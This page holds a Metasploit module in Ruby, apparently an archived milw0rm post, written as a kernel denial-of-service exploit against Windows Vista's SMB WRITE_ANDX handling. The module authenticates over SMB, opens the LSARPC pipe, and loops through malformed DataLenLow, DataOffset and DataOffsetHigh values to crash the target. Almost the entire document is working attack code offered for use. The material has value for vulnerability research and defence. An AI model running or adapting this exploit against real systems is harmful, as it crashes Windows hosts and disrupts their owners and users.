<html><head><title>MS Windows WRITE_ANDX SMB command handling Kernel DoS (meta)</title></head><pre>require 'msf/core'

module Msf
module Exploits
module Test


class BugTest &lt; Msf::Exploit::Remote


	include Exploit::Remote::SMB


	def initialize(info = {})
		super(update_info(info,
			'Name'           =&gt; 'test exploit',
			'Description'    =&gt; 	
				&quot;tests&quot;,
			'Author'         =&gt; 'tests',
			'License'        =&gt; MSF_LICENSE,
			'Version'        =&gt; '$Revision: 0 $',
			'Arch'           =&gt; 'x86',
			'Payload'        =&gt;
				{
					'Space' =&gt; 1000
				},
			'Targets'        =&gt; 
				[
					[
						'Windows VISTA',
						{
							'Platform' =&gt; 'win'
						}
					],
				],
			'DefaultTarget' =&gt; 0))
	end


	def subexploit(dlenlow, doffset,fillersize)

		print_line(&quot;1&quot;)

            datastore['SMBUser']='testuser'
            datastore['SMBPass']='testuser'
            datastore['SMBDomain']='COBAYA'
		datastore['SMBName']='COBAYA' 

		print_line(&quot;2&quot;)
		
		connect()

		print_line(&quot;3&quot;)

		smb_login()

		print_line(&quot;4&quot;)
 
               pkt = CONST::SMB_CREATE_PKT.make_struct

		pkt['Payload']['SMB'].v['Flags1'] = 0x18
		pkt['Payload']['SMB'].v['Flags2'] = 0xc807

		pkt['Payload']['SMB'].v['MultiplexID'] = simple.client.multiplex_id.to_i
		pkt['Payload']['SMB'].v['TreeID'] = simple.client.last_tree_id.to_i
		pkt['Payload']['SMB'].v['UserID'] = simple.client.auth_user_id.to_i
		pkt['Payload']['SMB'].v['ProcessID'] = simple.client.process_id.to_i

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX

		pkt['Payload']['SMB'].v['WordCount'] = 24
		
		pkt['Payload'].v['AndX'] = 255
		pkt['Payload'].v['AndXOffset'] = 0xdede
		pkt['Payload'].v['FileNameLen'] = 14
		pkt['Payload'].v['CreateFlags'] = 0x16
		pkt['Payload'].v['AccessMask'] = 0x2019f  # Maximum Allowed
		pkt['Payload'].v['ShareAccess'] = 7
		pkt['Payload'].v['CreateOptions'] = 0x400040
		pkt['Payload'].v['Impersonation'] = 2       
		pkt['Payload'].v['Disposition'] = 1
		pkt['Payload'].v['Payload'] = &quot;\x00\\\x00L\x00S\x00A\x00R\x00P\x00C&quot; + &quot;\x00\x00&quot;


		simple.client.smb_send(pkt.to_s)

		print_line(&quot;5&quot;)

		ack = simple.client.smb_recv_parse(CONST::SMB_COM_NT_CREATE_ANDX)
		
		pkt = CONST::SMB_WRITE_PKT.make_struct

		data_offset = pkt.to_s.length - 4

		print_line(&quot;6&quot;)
		
		filler = Rex::Text.rand_text(fillersize)

		print_line(&quot;7&quot;)

		pkt['Payload']['SMB'].v['Signature1']=0xcccccccc
		pkt['Payload']['SMB'].v['Signature2']=0xcccccccc
		pkt['Payload']['SMB'].v['MultiplexID'] = simple.client.multiplex_id.to_i
		pkt['Payload']['SMB'].v['TreeID'] = simple.client.last_tree_id.to_i
		pkt['Payload']['SMB'].v['UserID'] = simple.client.auth_user_id.to_i
		pkt['Payload']['SMB'].v['ProcessID'] = simple.client.process_id.to_i
		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_WRITE_ANDX
		pkt['Payload']['SMB'].v['Flags1'] = 0x18
		pkt['Payload']['SMB'].v['Flags2'] = 0xc807
		pkt['Payload']['SMB'].v['WordCount'] = 14
		pkt['Payload'].v['AndX'] = 255
		pkt['Payload'].v['AndXOffset'] = 0xdede
		pkt['Payload'].v['FileID'] = ack['Payload'].v['FileID']
		pkt['Payload'].v['Offset'] = 0
		pkt['Payload'].v['Reserved2'] = -1
		pkt['Payload'].v['WriteMode'] = 8
		pkt['Payload'].v['Remaining'] = fillersize
		pkt['Payload'].v['DataLenHigh'] = 0
		pkt['Payload'].v['DataLenLow'] = dlenlow #&lt;==================
		pkt['Payload'].v['DataOffset'] = doffset #&lt;====
		pkt['Payload'].v['DataOffsetHigh'] = 0xcccccccc #&lt;====
		pkt['Payload'].v['ByteCount'] = fillersize#&lt;====
		pkt['Payload'].v['Payload'] = filler

		print_line(&quot;8&quot;)
		
		simple.client.smb_send(pkt.to_s)
		
		print_line(&quot;9&quot;)

	end

	def exploit
		
		k=72
		j=0xffff
		while j&gt;10000
			i=0xffff
			while i&gt;10000
				begin
					print_line(&quot;datalenlow=#{i} dataoffset=#{j} fillersize=#{k}&quot;)
					subexploit(i,j,k)
				rescue
					print_line(&quot;rescue&quot;)
				end
				i=i-10000
			end
			j=j-10000
		end
		
	end

end

end
end
end

# milw0rm.com [2008-09-15]</pre></html>